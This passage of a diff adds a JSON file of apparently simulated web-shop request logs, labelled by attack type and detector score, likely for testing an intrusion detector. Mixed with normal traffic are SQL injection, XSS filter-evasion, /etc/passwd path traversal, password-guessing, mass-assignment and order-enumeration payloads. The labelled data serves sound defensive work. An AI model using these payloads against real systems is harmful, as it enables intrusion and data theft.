+    "m": "GET",
+    "p": "/products/search?q=men%27s%20speaker",
+    "b": "",
+    "st": 500,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.24
+    ],
+    "r": 0.25
+   },
+   {
+    "t": 17265.736,
+    "ip": "10.0.0.11",
+    "m": "GET",
+    "p": "/products/search?q=usb-c%20printer",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 17412.075,
+    "ip": "10.0.0.31",
+    "m": "GET",
+    "p": "/comments",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 17820.129,
+    "ip": "10.0.0.18",
+    "m": "GET",
+    "p": "/products/52",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 18277.799,
+    "ip": "203.85.85.12",
+    "m": "GET",
+    "p": "/products/search?q=%27%3B%20DROP%20TABLE%20users%3B%20--",
+    "b": "",
+    "st": 500,
+    "a": "sqli",
+    "s": [
+     0.8,
+     1,
+     0.99,
+     0.22
+    ],
+    "r": 1
+   },
+   {
+    "t": 18504.905,
+    "ip": "10.0.0.14",
+    "m": "GET",
+    "p": "/products/10",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.09
+    ],
+    "r": 0.09
+   },
+   {
+    "t": 19454.173,
+    "ip": "10.0.0.24",
+    "m": "GET",
+    "p": "/products/search?q=microphone",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.13
+    ],
+    "r": 0.13
+   },
+   {
+    "t": 19476.969,
+    "ip": "10.0.0.24",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"Would I buy it again? OR maybe wait for the next version.\"}",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.09
+    ],
+    "r": 0.1
+   },
+   {
+    "t": 19499.53,
+    "ip": "10.0.0.24",
+    "m": "GET",
+    "p": "/products/search?q=ssd%20silver",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 19540.656,
+    "ip": "10.0.0.24",
+    "m": "GET",
+    "p": "/comments",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 19555.676,
+    "ip": "10.0.0.24",
+    "m": "GET",
+    "p": "/files?name=readme.txt",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.02,
+     0.03
+    ],
+    "r": 0.05
+   },
+   {
+    "t": 20533.777,
+    "ip": "10.0.0.26",
+    "m": "GET",
+    "p": "/products/search?q=microphone%20%26%20accessories",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.05
+    ],
+    "r": 0.05
+   },
+   {
+    "t": 22620.114,
+    "ip": "77.151.132.179",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"<svg><script>alert&#40;1&#41;</script>\"}",
+    "st": 200,
+    "a": "xss",
+    "s": [
+     0.8,
+     1,
+     1,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 22673.982,
+    "ip": "77.151.132.179",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"<scr<script>ipt>alert(1)</scr</script>ipt>\"}",
+    "st": 200,
+    "a": "xss",
+    "s": [
+     0.5,
+     1,
+     1,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 22943.87,
+    "ip": "77.136.26.252",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user10\", \"password\": \"trustno1\"}",
+    "st": 401,
+    "a": "brute_force",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.29
+    ],
+    "r": 0.29
+   },
+   {
+    "t": 22954.604,
+    "ip": "77.136.26.252",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user10\", \"password\": \"football\"}",
+    "st": 401,
+    "a": "brute_force",
+    "s": [
+     1,
+     0,
+     0.01,
+     0.41
+    ],
+    "r": 1
+   },
+   {
+    "t": 22957.515,
+    "ip": "77.136.26.252",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user10\", \"password\": \"monkey\"}",
+    "st": 401,
+    "a": "brute_force",
+    "s": [
+     1,
+     0,
+     0.01,
+     0.47
+    ],
+    "r": 1
+   },
+   {
+    "t": 23914.649,
+    "ip": "10.0.0.27",
+    "m": "GET",
+    "p": "/products/search?q=router",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 23970.708,
+    "ip": "10.0.0.27",
+    "m": "GET",
+    "p": "/products/search?q=printer",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 23981.578,
+    "ip": "10.0.0.24",
+    "m": "GET",
+    "p": "/orders",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 24075.91,
+    "ip": "10.0.0.24",
+    "m": "GET",
+    "p": "/comments",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 24192.315,
+    "ip": "10.0.0.27",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"Great product, fast delivery!\"}",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.09
+    ],
+    "r": 0.09
+   },
+   {
+    "t": 25072.761,
+    "ip": "10.0.0.29",
+    "m": "GET",
+    "p": "/products/6",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 25481.105,
+    "ip": "10.0.0.16",
+    "m": "GET",
+    "p": "/products/13",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 25505.394,
+    "ip": "10.0.0.16",
+    "m": "GET",
+    "p": "/products/search?q=phone%20%26%20accessories",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 25610.904,
+    "ip": "10.0.0.16",
+    "m": "GET",
+    "p": "/users/me",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 25739.536,
+    "ip": "10.0.0.20",
+    "m": "GET",
+    "p": "/products/search?q=charger",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.07
+    ],
+    "r": 0.07
+   },
+   {
+    "t": 27325.803,
+    "ip": "10.0.0.10",
+    "m": "GET",
+    "p": "/orders",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 27433.72,
+    "ip": "10.0.0.10",
+    "m": "GET",
+    "p": "/products/search?q=dock",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 27539.794,
+    "ip": "10.0.0.4",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"email\": \"user2.59@example.com\"}",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.05,
+     0.07
+    ],
+    "r": 0.12
+   },
+   {
+    "t": 28304.826,
+    "ip": "10.0.0.11",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"role\": \"admin\", \"name\": \"x\"}",
+    "st": 200,
+    "a": "mass_assignment",
+    "s": [
+     0,
+     0,
+     0.99,
+     0.03
+    ],
+    "r": 0.99
+   },
+   {
+    "t": 28511.577,
+    "ip": "10.0.0.18",
+    "m": "GET",
+    "p": "/products/19",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 28585.829,
+    "ip": "10.0.0.17",
+    "m": "GET",
+    "p": "/orders",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.16
+    ],
+    "r": 0.16
+   },
+   {
+    "t": 28795.097,
+    "ip": "10.0.0.20",
+    "m": "GET",
+    "p": "/orders",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.07
+    ],
+    "r": 0.07
+   },
+   {
+    "t": 29183.608,
+    "ip": "10.0.0.7",
+    "m": "GET",
+    "p": "/products/search?q=dock",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 29246.483,
+    "ip": "10.0.0.27",
+    "m": "GET",
+    "p": "/files?name=terms.txt",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.07
+    ],
+    "r": 0.08
+   },
+   {
+    "t": 30143.542,
+    "ip": "103.0.127.77",
+    "m": "GET",
+    "p": "/products/search?q=webcam%20silver",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.11
+    ],
+    "r": 0.11
+   },
+   {
+    "t": 30151.965,
+    "ip": "103.0.127.77",
+    "m": "GET",
+    "p": "/products/search?q=1%27%20AND%20SLEEP%285%29%20--",
+    "b": "",
+    "st": 500,
+    "a": "sqli",
+    "s": [
+     0.8,
+     1,
+     0.99,
+     0.12
+    ],
+    "r": 1
+   },
+   {
+    "t": 30403.549,
+    "ip": "10.0.0.6",
+    "m": "GET",
+    "p": "/products/search?q=tablet",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 30507.356,
+    "ip": "10.0.0.3",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"is_admin\": true}",
+    "st": 200,
+    "a": "mass_assignment",
+    "s": [
+     0,
+     0,
+     0.96,
+     0.03
+    ],
+    "r": 0.96
+   },
+   {
+    "t": 30531.925,
+    "ip": "10.0.0.12",
+    "m": "GET",
+    "p": "/comments",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 30752.663,
+    "ip": "10.0.0.26",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"role\": \"admin\"}",
+    "st": 200,
+    "a": "mass_assignment",
+    "s": [
+     0,
+     0,
+     0.99,
+     0.03
+    ],
+    "r": 0.99
+   },
+   {
+    "t": 31131.757,
+    "ip": "10.0.0.25",
+    "m": "GET",
+    "p": "/products/13",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.14
+    ],
+    "r": 0.14
+   },
+   {
+    "t": 31252.007,
+    "ip": "10.0.0.25",
+    "m": "GET",
+    "p": "/users/me",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 31421.827,
+    "ip": "45.124.33.116",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user3\", \"password\": \"passw0rd\"}",
+    "st": 401,
+    "a": "brute_force",
+    "s": [
+     0.5,
+     0,
+     0.01,
+     0.33
+    ],
+    "r": 0.67
+   },
+   {
+    "t": 31423.453,
+    "ip": "45.124.33.116",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user8\", \"password\": \"12345678\"}",
+    "st": 401,
+    "a": "brute_force",
+    "s": [
+     0.5,
+     0,
+     0.01,
+     0.34
+    ],
+    "r": 0.67
+   },
+   {
+    "t": 31426.217,
+    "ip": "45.124.33.116",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user25\", \"password\": \"sunshine\"}",
+    "st": 401,
+    "a": "brute_force",
+    "s": [
+     1,
+     0,
+     0.01,
+     0.38
+    ],
+    "r": 1
+   },
+   {
+    "t": 32374.772,
+    "ip": "77.179.36.58",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user7\", \"password\": \"Passw0rd7!\"}",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 32448.25,
+    "ip": "10.0.0.25",
+    "m": "GET",
+    "p": "/products/11",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.14
+    ],
+    "r": 0.14
+   },
+   {
+    "t": 32849.26,
+    "ip": "45.48.64.187",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"<img src=x oNErRor=\\\"&#97;lert(1)\\\">\"}",
+    "st": 200,
+    "a": "xss",
+    "s": [
+     0.8,
+     1,
+     1,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 32867.726,
+    "ip": "45.48.64.187",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"<a HreF=\\\"JavaSCriPt:AlErT(1)\\\">cLIcK</A>\"}",
+    "st": 200,
+    "a": "xss",
+    "s": [
+     0.8,
+     1,
+     1,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 33718.587,
+    "ip": "10.0.0.13",
+    "m": "GET",
+    "p": "/orders/71",
+    "b": "",
+    "st": 200,
+    "a": "bola",
+    "s": [
+     0,
+     0,
+     0,
+     0.28
+    ],
+    "r": 0.28
+   },
+   {
+    "t": 33721.8,
+    "ip": "10.0.0.13",
+    "m": "GET",
+    "p": "/orders/74",
+    "b": "",
+    "st": 200,
+    "a": "bola",
+    "s": [
+     0,
+     0,
+     0,
+     0.35
+    ],
+    "r": 0.35
+   },
+   {
+    "t": 33886.014,
+    "ip": "10.0.0.19",
+    "m": "GET",
+    "p": "/products/search?q=usb-c%20backpack",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.16
+    ],
+    "r": 0.16
+   },
+   {
+    "t": 33920.012,
+    "ip": "10.0.0.8",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"email\": \"user6.86@example.com\"}",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.03,
+     0.03
+    ],
+    "r": 0.07
+   },
+   {
+    "t": 34186.198,
+    "ip": "10.0.0.12",
+    "m": "GET",
+    "p": "/products/38",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 34730.142,
+    "ip": "185.77.92.94",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"<BOdY onlOAD=ALeRT('xsS')>\"}",
+    "st": 200,
+    "a": "xss",
+    "s": [
+     0.8,
+     1,
+     1,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 34884.827,
+    "ip": "10.0.0.16",
+    "m": "GET",
+    "p": "/users/me",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 34892.853,
+    "ip": "10.0.0.16",
+    "m": "GET",
+    "p": "/users/me",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 34902.821,
+    "ip": "10.0.0.16",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"isAdmin\": true, \"role\": \"superuser\"}",
+    "st": 200,
+    "a": "mass_assignment",
+    "s": [
+     0,
+     0,
+     0.99,
+     0.03
+    ],
+    "r": 0.99
+   },
+   {
+    "t": 34907.498,
+    "ip": "10.0.0.16",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"email\": \"user14@example.com\", \"role\": \"admin\"}",
+    "st": 200,
+    "a": "mass_assignment",
+    "s": [
+     0,
+     0,
+     0.97,
+     0.03
+    ],
+    "r": 0.97
+   },
+   {
+    "t": 35530.654,
+    "ip": "10.0.0.4",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"I love it <3\"}",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 36271.861,
+    "ip": "45.87.11.144",
+    "m": "GET",
+    "p": "/files?name=../../etc/passwd",
+    "b": "",
+    "st": 200,
+    "a": "path_traversal",
+    "s": [
+     1,
+     1,
+     1,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 36278,
+    "ip": "45.87.11.144",
+    "m": "GET",
+    "p": "/files?name=/etc/passwd",
+    "b": "",
+    "st": 200,
+    "a": "path_traversal",
+    "s": [
+     0.5,
+     1,
+     0.95,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 36293.072,
+    "ip": "45.87.11.144",
+    "m": "GET",
+    "p": "/files?name=..%5c..%5cetc%5cpasswd",
+    "b": "",
+    "st": 404,
+    "a": "path_traversal",
+    "s": [
+     0.5,
+     1,
+     0.99,
+     0.19
+    ],
+    "r": 1
+   },
+   {
+    "t": 37156.13,
+    "ip": "10.0.0.6",
+    "m": "GET",
+    "p": "/orders/77",
+    "b": "",
+    "st": 200,
+    "a": "bola",
+    "s": [
+     0,
+     0,
+     0,
+     0.51
+    ],
+    "r": 0.51
+   },
+   {
+    "t": 37164.53,
+    "ip": "10.0.0.6",
+    "m": "GET",
+    "p": "/orders/107",
+    "b": "",
+    "st": 404,
+    "a": "bola",
+    "s": [
+     0,
+     0,
+     0,
+     0.58
+    ],
+    "r": 0.58
+   },
+   {
+    "t": 37995.279,
+    "ip": "10.0.0.13",
+    "m": "GET",
+    "p": "/orders",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 38008.442,
+    "ip": "10.0.0.13",
+    "m": "GET",
+    "p": "/products/search?q=phone",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 38059.689,
+    "ip": "10.0.0.13",
+    "m": "GET",
+    "p": "/products/search?q=router",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 38093.694,
+    "ip": "10.0.0.13",
+    "m": "GET",
+    "p": "/comments",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 38145.33,
+    "ip": "10.0.0.14",
+    "m": "GET",
+    "p": "/orders",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.14
+    ],
+    "r": 0.14
+   },
+   {
+    "t": 38152.927,
+    "ip": "10.0.0.14",
+    "m": "GET",
+    "p": "/users/me",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.06
+    ],
+    "r": 0.06
+   },
+   {
+    "t": 39671.888,
+    "ip": "10.0.0.31",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user29\", \"password\": \"Passw0rd29!\"}",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 42269.181,
+    "ip": "10.0.0.24",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"email\": \"user22.20@example.com\"}",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.04,
+     0.07
+    ],
+    "r": 0.11
+   },
+   {
+    "t": 42645.317,
+    "ip": "77.115.42.191",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"<details open ontoggle=alert(1)>\"}",
+    "st": 200,
+    "a": "xss",
+    "s": [
+     0.8,
+     1,
+     0.99,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 42679.776,
+    "ip": "103.76.206.63",
+    "m": "GET",
+    "p": "/products/search?q=%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F5%2F%2A%2A%2F--",
+    "b": "",
+    "st": 500,
+    "a": "sqli",
+    "s": [
+     0.6,
+     0.5,
+     1,
+     0.24
+    ],
+    "r": 1
+   },
+   {
+    "t": 42782.943,
+    "ip": "194.213.137.59",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"<a HReF=\\\"jAVAscriPT:Alert(1)\\\">CliCK</A>\"}",
+    "st": 200,
+    "a": "xss",
+    "s": [
+     0.8,
+     1,
+     1,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 43195.839,
+    "ip": "194.102.144.83",
+    "m": "GET",
+    "p": "/files?name=....//....//etc/passwd",
+    "b": "",
+    "st": 404,
+    "a": "path_traversal",
+    "s": [
+     1,
+     1,
+     1,
+     0.32
+    ],
+    "r": 1
+   },
+   {
+    "t": 44333.581,
+    "ip": "10.0.0.25",
+    "m": "GET",
+    "p": "/comments",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 44377.5,
+    "ip": "10.0.0.10",
+    "m": "GET",
+    "p": "/products/search?q=speaker",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 44400.682,
+    "ip": "10.0.0.25",
+    "m": "GET",
+    "p": "/products/6",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.12
+    ],
+    "r": 0.12
+   },
+   {
+    "t": 44583.381,
+    "ip": "10.0.0.28",
+    "m": "GET",
+    "p": "/products/2",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 44664.375,
+    "ip": "10.0.0.28",
+    "m": "GET",
+    "p": "/products/55",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 44723.801,
+    "ip": "10.0.0.28",
+    "m": "GET",
+    "p": "/products/search?q=usb-c%20dock",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 45412.26,
+    "ip": "103.71.241.211",
+    "m": "GET",
+    "p": "/products/search?q=%27%2F%2A%2A%2FOR%2F%2A%2A%2F%27a%27%3D%27a",
+    "b": "",
+    "st": 200,
+    "a": "sqli",
+    "s": [
+     0.5,
+     0.5,
+     1,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 46337.013,
+    "ip": "10.0.0.23",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user21\", \"password\": \"Passw0rd21!\"}",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 46497.192,
+    "ip": "10.0.0.23",
+    "m": "GET",
+    "p": "/products/search?q=ssd",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 46555.18,
+    "ip": "10.0.0.23",
+    "m": "GET",
+    "p": "/products/search?q=mouse",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 47010.787,
+    "ip": "10.0.0.26",
+    "m": "GET",
+    "p": "/orders/74",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.33
+    ],
+    "r": 0.33
+   },
+   {
+    "t": 47135.549,
+    "ip": "91.91.227.119",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"' AND 1=2 UNION SELECT id, username, role FROM users --\"",
+    "st": 200,
+    "a": "sqli",
+    "s": [
+     1,
+     1,
+     1,
+     0.12
+    ],
+    "r": 1
+   },
+   {
+    "t": 47757.184,
+    "ip": "10.0.0.20",
+    "m": "GET",
+    "p": "/products/search?q=speaker",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 47852.441,
+    "ip": "10.0.0.20",
+    "m": "GET",
+    "p": "/products/search?q=headset",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 48673.372,
+    "ip": "91.76.167.64",
+    "m": "GET",
+    "p": "/products/search?q=webcam",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.2
+    ],
+    "r": 0.2
+   },
+   {
+    "t": 48690.98,
+    "ip": "91.76.167.64",
+    "m": "GET",
+    "p": "/products/search?q=%27%3B%2F%2A%2A%2FDROP%2F%2A%2A%2FTABLE%2F%2A%2A%2Fusers%3B%2F%2A%2A%2F",
+    "b": "",
+    "st": 500,
+    "a": "sqli",
+    "s": [
+     0.8,
+     1,
+     1,
+     0.26
+    ],
+    "r": 1
+   },
+   {
+    "t": 50264.936,
+    "ip": "10.0.0.19",
+    "m": "GET",
+    "p": "/comments",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 50848.159,
+    "ip": "194.82.99.64",
+    "m": "GET",
+    "p": "/files?name=....//....//etc/passwd",
+    "b": "",
+    "st": 404,
+    "a": "path_traversal",
+    "s": [
+     1,
+     1,
+     1,
+     0.28
+    ],
+    "r": 1
+   },
+   {
+    "t": 51603.584,
+    "ip": "10.0.0.13",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user11\", \"password\": \"Passw0rd11!\"}",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 53568.5,
+    "ip": "10.0.0.18",
+    "m": "GET",
+    "p": "/users/me",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 54768.849,
+    "ip": "10.0.0.5",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"email\": \"user3.10@example.com\"}",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.03,
+     0.03
+    ],
+    "r": 0.07
+   },
+   {
+    "t": 54818.102,
+    "ip": "10.0.0.5",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"Price went from $120 to $99 -- nice deal\"}",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.02,
+     0.03
+    ],
+    "r": 0.05
+   },
+   {
+    "t": 54851.323,
+    "ip": "10.0.0.5",
+    "m": "GET",
+    "p": "/products/search?q=tablet%2050%25%20off",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 55045.824,
+    "ip": "185.158.103.129",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"';/**/DROP/**/TABLE/**/users;/**/--\", \"password\": \"test\"",
+    "st": 500,
+    "a": "sqli",
+    "s": [
+     0.8,
+     1,
+     1,
+     0.24
+    ],
+    "r": 1
+   },
+   {
+    "t": 55379.708,
+    "ip": "203.134.32.201",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"<svg><script>alert&#40;1&#41;</script>\"}",
+    "st": 200,
+    "a": "xss",
+    "s": [
+     0.8,
+     1,
+     1,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 55402.138,
+    "ip": "203.134.32.201",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"<input autofocus onfocus=alert(1)>\"}",
+    "st": 200,
+    "a": "xss",
+    "s": [
+     0.8,
+     1,
+     0.99,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 55522.212,
+    "ip": "10.0.0.32",
+    "m": "GET",
+    "p": "/products/search?q=phone",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 56269.934,
+    "ip": "10.0.0.6",
+    "m": "GET",
+    "p": "/products/search?q=cable%20%26%20accessories",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
